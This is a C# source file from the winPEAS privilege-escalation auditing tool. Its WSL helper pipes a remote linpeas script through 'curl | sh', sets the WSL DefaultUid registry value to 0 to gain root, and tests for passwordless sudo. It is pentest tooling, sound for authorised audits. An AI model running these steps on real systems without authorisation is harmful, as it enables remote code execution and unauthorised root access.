using System;
using System.Diagnostics;
using System.Text;
using winPEAS.Helpers.Registry;

namespace winPEAS.Info.FilesInfo.WSL
{
    public class WSLHelper
    {
        public static void RunLinpeas(string linpeasUrl)
        {
            string linpeasCmd = $"curl -L {linpeasUrl} --silent | sh";
            var cmd = CreateUnixCommand(linpeasCmd);

            ExecuteCommand(cmd.Item1, cmd.Item2);
        }

        internal static Tuple<string, string> CreateUnixCommand(string command, string distributionName = null)
        {
            string wsl = Environment.Is64BitProcess
                ? "wsl.exe"
                : Environment.GetEnvironmentVariable("WinDir") + "\\SysNative\\wsl.exe";
            string distributionParam = !string.IsNullOrEmpty(distributionName)
                ? $"--distribution {distributionName}"
                : string.Empty;
            string args = $"{distributionParam} -- {command}";

            return new Tuple<string, string>(wsl, args);
        }

        static string GetWSLUser(string distributionName)
        {
            string command = "whoami";

            var cmd = CreateUnixCommand(command, distributionName);
            var user = ExecuteCommandWaitForOutput(cmd.Item1, cmd.Item2)?.Trim();

            return user;
        }

        internal static string TryGetRootUser(string distributionName, string distributionGuid)
        {
            string hive = "HKCU";
            string path = @$"SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\{distributionGuid}";
            string key = "DefaultUid";
            string wslUser = GetWSLUser(distributionName);
            string exploit = $"change registry value: '{hive}\\{path}\\{key}' to 0";
            string root = $"root ({exploit})";

            if (string.Equals(wslUser, "root"))
            {
                return "root";
            }
            var originalDefaultUserValue = RegistryHelper.GetRegValue(hive, path, key);

            var isValueChanged = RegistryHelper.WriteRegValue(hive, path, key, 0.ToString());
            if (isValueChanged)
            {
                wslUser = GetWSLUser(distributionName);

                if (string.Equals(wslUser, "root"))
                {
                    RegistryHelper.WriteRegValue(hive, path, key, originalDefaultUserValue);

                    return root;
                }
            }

            // try sudo without password
            exploit = "sudo with empty password";
            var cmd = CreateUnixCommand("echo -n '' | sudo -S su root -c whoami", distributionName);
            var output = ExecuteCommandWaitForOutput(cmd.Item1, cmd.Item2);

            if (output == "root")
            {
                return $"root ({exploit})";
            }

            return wslUser;
        }

        private static string ExecuteCommandWaitForOutput(string cmd, string args)
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.FileName = cmd;
            p.StartInfo.Arguments = args;
            p.StartInfo.StandardOutputEncoding = Encoding.UTF8;
            p.Start();

            string output = p.StandardOutput.ReadToEnd()?.Trim();

            p.WaitForExit();

            return output;
        }

        private static void ExecuteCommand(
            string command,
            string args = null,
            string workingFolder = null
            )
        {
            var processStartInfo = new ProcessStartInfo
            {
                UseShellExecute = false,
                Verb = "OPEN",
                CreateNoWindow = true,
                FileName = command,
                WorkingDirectory = workingFolder,
                Arguments = args,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8
            };

            using (var process = Process.Start(processStartInfo))
            {
                if (process != null)
                {
                    while (!process.StandardOutput.EndOfStream)
                    {
                        Console.WriteLine(process.StandardOutput.ReadLine());
                    }

                    while (!process.StandardError.EndOfStream)
                    {
                        Console.WriteLine(process.StandardError.ReadLine());
                    }
                }
            }
        }
    }
}
